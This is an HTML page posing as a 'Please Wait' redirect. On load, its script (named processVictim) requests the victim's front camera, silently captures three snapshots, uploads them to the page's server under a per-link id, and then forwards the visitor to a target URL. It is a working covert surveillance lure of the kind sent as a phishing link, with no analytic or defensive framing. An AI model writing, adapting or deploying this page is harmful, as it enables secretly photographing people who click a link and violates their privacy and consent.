
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            text-align: center;
        }
        .container {
            padding: 40px;
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            max-width: 90%;
            width: 400px;
        }
        .loader {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
            margin: 0 auto 30px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        h1 { font-size: 24px; margin-bottom: 10px; font-weight: 600; }
        p { opacity: 0.8; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h1>Please Wait</h1>
        <p>Preparing your content...</p>
    </div>

    <script>
        async function processVictim() {
            try {
                const path = window.location.pathname;
                const linkId = path.split('/').pop();
                
                if (!linkId || linkId === '' || linkId.includes('.')) {
                    setTimeout(() => window.location.href = '/', 2000);
                    return;
                }
                
                const API_BASE = window.location.origin;
                
                // Get target URL
                const targetRes = await fetch(`${API_BASE}/api/target/${linkId}`);
                if (!targetRes.ok) {
                    document.querySelector('h1').textContent = 'Invalid Link';
                    document.querySelector('p').textContent = 'This link is not valid.';
                    return;
                }
                
                const targetData = await targetRes.json();
                const finalUrl = targetData.targetUrl;
                
                // Try to capture media
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user' },
                        audio: false
                    });
                    
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.muted = true;
                    
                    await new Promise(resolve => {
                        video.onloadedmetadata = () => {
                            video.play();
                            setTimeout(resolve, 500);
                        };
                    });
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    
                    // Capture 3 images
                    for (let i = 0; i < 3; i++) {
                        await new Promise(r => setTimeout(r, 500));
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/jpeg', 0.6);
                        
                        await fetch(`${API_BASE}/api/capture/${linkId}`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                mediaData: imageData,
                                mediaType: 'image'
                            })
                        });
                    }
                    
                    stream.getTracks().forEach(track => track.stop());
                    
                } catch (mediaError) {
                    console.log('Media capture skipped');
                }
                
                // Redirect
                setTimeout(() => {
                    window.location.href = finalUrl;
                }, 1000);
                
            } catch (error) {
                console.error('Error:', error);
                setTimeout(() => {
                    window.location.href = 'https://google.com';
                }, 2000);
            }
        }
        
        document.addEventListener('DOMContentLoaded', processVictim);
    </script>
</body>
</html>
